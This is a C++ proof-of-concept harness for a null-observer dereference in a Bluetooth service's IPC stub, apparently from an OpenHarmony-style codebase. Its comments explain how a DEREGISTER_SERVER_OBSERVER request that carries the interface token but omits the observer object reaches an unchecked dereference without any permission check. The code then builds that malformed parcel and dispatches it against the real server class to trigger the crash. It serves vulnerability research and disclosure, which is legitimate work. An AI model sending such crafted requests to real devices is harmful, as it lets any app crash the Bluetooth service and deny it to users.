// PoC harness: bluetooth_service DeregisterServerObserver null-observer deref.
//
// Attacker shape (per services/bluetooth/ipc/src/bluetooth_socket_stub.cpp,
// official tree @ 2e9e230): a DEREGISTER_SERVER_OBSERVER (code=2) request whose
// parcel carries the correct interface token but omits the observer remote
// object. The stub reads the observer with iface_cast(data.ReadRemoteObject())
// without a null check and forwards it to BluetoothSocketServer::
// DeregisterServerObserver (virtual override), which dereferences
// observer->AsObject(). memberFuncMap_ registers no permission for this code
// (nullptr => VerifyMultiPermissions returns BT_NO_ERROR), so any app reaching
// the socket SA can trigger it.
//
// The harness instantiates the real BluetoothSocketServer (the class the
// service process runs) from libbluetooth_server.so and drives the inherited
// OnRemoteRequest in-process; the crash frame lands inside the real service
// library at the unguarded DeregisterServerObserver.

#include <cstdint>
#include <iostream>

#include "message_parcel.h"

#include "bluetooth_service_ipc_interface_code.h"
#include "bluetooth_socket_server.h"

int main()
{
    OHOS::Bluetooth::BluetoothSocketServer server;
    OHOS::MessageParcel data;
    OHOS::MessageParcel reply;
    OHOS::MessageOption option;

    if (!data.WriteInterfaceToken(OHOS::Bluetooth::BluetoothSocketStub::GetDescriptor())) {
        std::cout << "case=write_token_failed" << std::endl;
        return 2;
    }
    // Observer remote object deliberately omitted: next ReadRemoteObject() -> null.

    const uint32_t code = static_cast<uint32_t>(OHOS::Bluetooth::DEREGISTER_SERVER_OBSERVER);
    std::cout << "case=bt_server_dereg_null code=" << code << " dispatching" << std::endl;
    int32_t ret = server.OnRemoteRequest(code, data, reply, option);
    std::cout << "case=bt_server_dereg_null returned ret=" << ret << " (no crash)" << std::endl;
    return 0;
}
